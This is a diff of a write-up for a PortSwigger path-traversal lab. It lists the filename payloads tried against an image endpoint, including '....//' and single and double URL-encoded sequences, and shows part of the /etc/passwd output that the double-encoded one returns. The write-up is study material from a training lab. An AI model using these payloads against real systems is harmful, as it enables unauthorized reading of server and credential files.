@@ -1,10 +1,14 @@
 ## Lab Description :
 
-![image](https://github.com/eeugenewyj/Portswigger_Labs/blob/main/assets/Screenshot%202026-01-29%20130435.png)
+```
+This lab contains a path traversal vulnerability in the display of product images.
+The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
+To solve the lab, retrieve the contents of the /etc/passwd file. 
+```
 
 ## Solution :
 
-Similar to previous lab, try to open any image in a new tab, a GET request is sent as follows.
+Similar to previous labs, try to open any image in a new tab, a GET request is sent as follows.
 
 ```
 GET /image?filename=59.jpg HTTP/2
@@ -24,11 +28,15 @@ Priority: u=0, i
 Te: trailers
 ```
 
-We attempt to use the previous lab's path `/../../../../../etc/passwd` and the lab returns with `"No such file"`
+[Relative Path Traversal] We attempt to use the previous lab's path `/../../../../../etc/passwd`. Doesn't Work.
 
-Slowly remove each `/../` to identify the correct absolute path.
+[Absolute path traversal] Slowly remove each `/../` to attempt at identifying the correct absolute path. Doesn't Work.
 
-Finally, this GET request `GET /image?filename=/etc/passwd HTTP/2` returns the contents of `/etc/passwd` that we are interested in.
+[Path Traversal Filter‑Bypass] We attempt this path `....//....//....//....//etc/passwd` to bypass dot‑dot normalization. Doesn't Work.
+
+[URL Encoding] We attempt this path to bypass URL encoding `..%2F..%2F..%2F..%2Fetc%2Fpasswd`. Doesn't Work.
+
+[Double URL Encoding] We attempt this path to bypass Double URL encoding `..%252F..%252F..%252F..%252Fetc%252Fpasswd`. Works.
 
 ```
 HTTP/2 200 OK
@@ -77,6 +85,6 @@ saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
 colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
 pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
+
 ```
 
-![image](https://github.com/eeugenewyj/Portswigger_Labs/blob/main/assets/Screenshot%202026-01-29%20131851.png)
